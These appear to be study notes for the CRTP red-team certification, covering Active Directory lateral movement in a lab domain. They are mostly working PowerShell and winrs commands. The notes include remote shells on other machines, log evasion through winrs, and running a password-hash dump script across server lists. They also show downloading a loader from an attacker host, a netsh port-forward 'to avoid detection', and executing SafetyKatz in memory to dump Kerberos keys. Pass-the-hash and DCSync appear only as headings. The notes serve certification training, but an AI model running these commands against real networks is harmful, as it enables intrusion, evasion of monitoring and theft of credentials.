# CRTP

# Lateral Movement 
```powershell
One-To-One
#Avoid using psexec as it is too noisy. instead, to use "Enter-PSSession" you need Admin Privs
Enter-PSSession -ComputerName <dcorp-adminsrv>
#After getting the access run `whomai` to get the username, run `hostname` to get the pc name

Using Invoke-Command
Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt

you can use winrs in place of PSRemoting to evade the logging (more stealthy)
winrs -r:dcorp-mgmt hostname;whoami  #run command to check whether we have access or not
winrs -r:dcorp-mgmt cmd  #get a cmd shell on mgmt machine
```
```powershell
One-To-Many
#Execute a Command
Invoke-Command -Scriptblock {ls env:} -ComputerName (Get-Content <list_of_servers>)
#Execute a Script
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell
#storing the session in a variable
$var = Enter-PSSession -ComputerName dcorp-admin

#Enter the session
Enter-PSSession -Session $var

#Interact with the target machine
Invoke-Command -Session $var -ScriptBlock {ls env:}
```

# Lateral Movement - Invoke-Mimikatz
```powershell
After Abusing winrs
#Use SafetyKatz.exe to dump the hashes
1- Run the following command on the reverse shell
PS> iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe

2- Now, copy the Loader.exe to dcorp-mgmt:
PS> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

3- Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt: 
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

4- Use Loader.exe to download and execute SafetyKatz.exe in-memory on dcorp-mgmt
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

After Abusing PowerShell Remoting
```

```Powershell
Pass-The-Hash

Over-Pass-The-Hash  #for better offsec use AES keys than NTLM

DCSync


```
